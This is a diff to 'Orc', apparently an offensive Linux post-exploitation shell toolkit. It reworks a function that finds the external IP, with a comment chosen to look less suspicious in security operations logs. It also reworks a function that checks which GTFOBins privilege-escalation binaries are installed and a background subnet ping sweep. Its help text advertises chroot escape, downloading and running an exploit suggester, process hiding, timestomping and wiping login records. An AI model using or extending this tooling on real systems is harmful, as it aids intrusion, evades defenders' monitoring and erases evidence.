@@ -1349,24 +1349,46 @@ fpssh() {
 }
 
 getip() {
-#we use akamai and google here because they're gonna look less dodgy in SOC's logs
-echo 'Attempting to get IP...'
-printf 'HTTP says: '
-	orc_loadURL 'https://whatismyip.akamai.com'
-echo ''
-printf 'DNS says: '
-	if orc_existsProg dig; then
-	dig +time=3 +tries=1 TXT +short o-o.myaddr.l.google.com @ns1.google.com | tr -d \"
-	echo '(used dig)'
-	else
-	host -W 3 -t txt o-o.myaddr.l.google.com ns1.google.com | grep $orc_colorNever descriptive | awk -F ' ' '{print $4}' | tr -d '"' | tr -d "\n"
-	echo '(used host)'
-	fi
+  #we use akamai and google here because they're gonna look less dodgy in SOC's logs
+  echo 'Attempting to get IP...'
+  printf 'HTTP says: '
+  orc_loadURL 'https://whatismyip.akamai.com'
+  echo ''
+  printf 'DNS says: '
+  if orc_existsProg dig; then
+    dig +time=3 +tries=1 TXT +short o-o.myaddr.l.google.com @ns1.google.com | tr -d \"
+    echo '(used dig)'
+  else
+    host -W 3 -t txt o-o.myaddr.l.google.com ns1.google.com | grep $orc_colorNever descriptive | awk -F ' ' '{print $4}' | tr -d '"' | tr -d "\n"
+    echo '(used host)'
+  fi
 }
 
+
 getgtfobins() {
-type $(orc_loadURL 'https://gtfobins.github.io/' | grep --color=never "gtfobins/" | grep "td\>" | awk -F "/" '{print $3}' | tr '\n' ' ')
+  # Pulls down the list of current gtfobins and checks to see
+  # which are installed in your $PATH
+  orc_local cmd_name n_found n_notfound n_total
+  n_notfound=0
+  n_found=0
+  n_total=0
+  orc_loadURL 'https://gtfobins.github.io/' |
+  grep $orc_colorNever 'gtfobins/' |
+  grep $orc_colorNever 'td\>' |
+  awk -F '/' '{print $3}' | (
+    while read -r cmd_name; do
+      n_total=$(( n_total + 1 ))
+      if orc_existsProg "$cmd_name"; then
+        echo "$cmd_name"
+        n_found=$(( n_found + 1 ))
+      else
+        n_notfound=$(( n_notfound + 1 ))
+      fi
+    done
+    echo "GTFOBins: $n_found of $n_total commands found, $n_notfound not found"
+  )
 }
+
 
 prochide() {
   # Execute a program hidden by a long program name.
@@ -1391,10 +1413,10 @@ getnet() {
   orc_collectOtherHostsInfo
   echo "Pinging local IPv4 address in background writing $HOME/ips ..."
   orc_inetAddressAndMask |
-   while read -r addr mask; do
-     echo "Pinging subnet around $addr with mask $mask"
-     ( orc_pingIP4localnet "$addr" "$mask"  >> $HOME/ips )&
-   done
+       while read -r addr mask; do
+         echo "Pinging subnet around $addr with mask $mask"
+         ( orc_pingIP4localnet "$addr" "$mask"  >> $HOME/ips )&
+       done
 }
 
 
@@ -1583,8 +1605,9 @@ A probably non-comprehensive list of functionality in Orc v$OVERSION.
 [*]      getenum - get kernel, glibc, and dbus versions
 [*]    getescape - attempt to escape chroot via bad privs
 [*]                on the /proc/ filesystem
-[*]	getsctp - check if the box has support for SCTP
+[*]	     getsctp - check if the box has support for SCTP
 [*]   getexploit - download and run linux-exploit-suggester
+[*]  getgtfobins - pull a list of the current gtfobins and find which are on the system
 [*]      getidle - list all ptys and their idle times accurately.
 [*]      getinfo - create a tar.xz of useful command output
 [*]        getip - get external IP from akamai and google (HTTP and DNS)
@@ -1615,7 +1638,6 @@ A probably non-comprehensive list of functionality in Orc v$OVERSION.
 [*]        stomp - alias for touch -r (needs arguments)
 [*]        tools - check for common tools
 [*]        wiper - remove entries from wtmp - wiper [string to grep out]
-[*]	   getgtfobins - pull a list of the current gtfobins and find which are on the system
 "
 }
 
